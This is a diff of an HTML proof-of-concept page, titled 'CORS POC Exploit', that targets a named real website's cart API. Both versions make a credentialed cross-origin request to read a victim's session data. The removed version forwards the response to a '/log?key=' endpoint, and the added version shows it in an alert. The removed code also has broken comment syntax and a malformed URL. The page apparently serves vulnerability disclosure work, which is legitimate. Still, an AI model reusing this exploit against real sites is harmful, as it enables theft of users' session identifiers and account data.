@@ -1,27 +1,27 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <script>
-
-    #Initialize the XMLHttpRequest object, and the application URL vairable 
-        var req = new XMLHttpRequest();
-        var url = ("https://vplates.com.au/vplatesapi/cxa/cart/GetCartWithPlateDetails");
-
-    #MLHttpRequest object loads, exectutes reqListener() function
-      req.onload = retrieveKeys;
-
-    #Make GET request to the application accounDetails location
-        req.open('GET', url + "vplatesapi/cxa/cart/GetCartWithPlateDetails",true);
-    
-    #Allow passing credentials with the requests
-    req.withCredentials = true;
-
-    #Send the request 
-        req.send(null);
-
-    function retrieveKeys() {
-            location='/log?key='+this.responseText;
-        };
-
-  </script>
-  <body>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://vplates.com.au/vplatesapi/cxa/cart/GetCartWithPlateDetails", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
 </html>
